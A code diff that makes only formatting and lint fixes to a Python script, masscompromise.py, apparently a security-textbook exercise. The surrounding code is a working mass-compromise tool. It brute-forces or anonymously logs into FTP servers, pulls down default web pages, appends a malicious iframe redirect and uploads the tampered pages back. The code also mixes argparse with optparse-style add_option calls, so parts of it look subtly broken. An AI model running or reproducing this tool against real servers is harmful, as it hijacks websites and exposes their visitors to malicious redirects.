@@ -4,6 +4,7 @@ import argparse
 import time
 import sys
 
+
 def anonLogin(ip):
     ''' anonymous login'''
     try:
@@ -17,10 +18,13 @@ def anonLogin(ip):
         print('[-] Exception: ' + str(e))
         return False
 
+
 def bruteLogin(ip, passwdFile):
     ''' brute login'''
     try:
-        pF = open(passwdFile, 'r', encoding='utf-8-sig')# pylint: disable=R1732
+        pF = open(passwdFile,
+                  'r',
+                  encoding='utf-8-sig')  # pylint: disable=R1732
     except Exception as e:
         print('[-] File Not Found: ' + str(e))
         return None
@@ -32,13 +36,14 @@ def bruteLogin(ip, passwdFile):
         try:
             ftp = ftplib.FTP(ip)
             ftp.login(userName, passWord)
-            print('\n[*] ' + str(ip) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)
+            print('\n[*] ' + str(ip) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)  # noqa: E501
             ftp.quit()
             return (userName, passWord)
-        except Exception as e:
+        except Exception as e:  # noqa: F841
             pass
     print('\n[-] Could not brute force FTP credentials.')
     return (None, None)
+
 
 def returnDefault(ftp):
     ''' return the default pages for the chapter 2'''
@@ -57,16 +62,22 @@ def returnDefault(ftp):
             retList.append(fileName)
     return retList
 
+
 def injectPage(ftp, page, redirect):
     ''' inject the redirect page'''
-    f = open(page + '.tmp', 'w', encoding='utf-8-sig') # pylint: disable=R1732
+    f = open(page + '.tmp',
+             'w',
+             encoding='utf-8-sig')  # pylint: disable=R1732
     ftp.retrlines('RETR ' + page, f.write)
     print('[+] Downloaded Page: ' + page)
     f.write(redirect)
     f.close()
     print('[+] Injected Malicious IFrame on: ' + page)
-    ftp.storlines('STOR ' + page, open(page + '.tmp', 'r', encoding='utf-8-sig')) # pylint: disable=R1732
+    ftp.storlines('STOR ' + page, open(page + '.tmp',
+                                       'r',
+                                       encoding='utf-8-sig'))  # pylint: disable=R1732  # noqa: E501
     print('[+] Uploaded Injected Page: ' + page)
+
 
 def attack(username, password, tgtHost, redirect):
     ''' attack the ftp'''
@@ -76,9 +87,10 @@ def attack(username, password, tgtHost, redirect):
     for defPage in defPages:
         injectPage(ftp, defPage, redirect)
 
+
 def main():
     ''' main function'''
-    parser = argparse.ArgumentParser(usage='masscompromise.py -H <target host[s]> -r <redirect page> [-f <userpass file>]')
+    parser = argparse.ArgumentParser(usage='masscompromise.py -H <target host[s]> -r <redirect page> [-f <userpass file>]')  # noqa: E501
     parser.add_option('-H', type='string', help='specify target host')
     parser.add_option('-f', type='string', help='specify user/password file')
     parser.add_option('-r', type='string', help='specify a redirection page')
@@ -100,8 +112,9 @@ def main():
         elif passwdFile is not None:
             (username, password) = bruteLogin(tgtHost, passwdFile)
         if password is not None:
-            print('[+] Using Creds: ' + username + '/' + password + ' to attack')
+            print('[+] Using Creds: ' + username + '/' + password + ' to attack')  # noqa: E501
             attack(username, password, tgtHost, redirect)
+
 
 if __name__ == '__main__':
     main()
